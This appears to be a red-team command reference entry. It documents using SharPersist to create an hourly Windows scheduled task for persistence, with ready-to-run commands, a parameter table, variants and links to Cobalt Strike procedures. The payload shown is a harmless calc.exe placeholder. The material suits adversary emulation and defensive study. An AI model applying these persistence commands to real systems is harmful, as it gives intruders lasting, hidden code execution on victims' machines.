---
type: command
executor: powershell
data: >-
  SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n
  "Some Task" -m add -o hourly
tags:
  - persistence
  - creation
platforms:
  - Windows
verified: true
validated: true
---

# sharpersist-add-hourly-scheduled-task-persistence

## Command

```powershell
SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
```

## Description

Creates a scheduled task that runs hourly, suitable for frequent payload execution in ongoing operations.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-t schtask` | Type: Standard scheduled task | Yes |
| `-c <command>` | Executable path | Yes |
| `-a <args>` | Task arguments | Yes |
| `-n <name>` | Task name | Yes |
| `-m add` | Add mode | Yes |
| `-o hourly` | Frequency: hourly recurrence | Yes |

## Examples

### Basic Usage

```powershell
SharPersist -t schtask -c "powershell.exe" -a "-c ..." -n "HourlyCheck" -m add -o hourly
```

### Advanced Usage

```powershell
SharPersist -t schtask -c "rundll32.exe" -a "shell32.dll,Control_RunDLL" -n "Some Task" -m add -o hourly
```

## Expected Output

```
Hourly scheduled task added: Some Task
```

## Related

- [[procedures/Establish-Persistence-Using-SharPersist-in-Cobalt-Strike]]
- [[tools/Cobalt-Strike]]
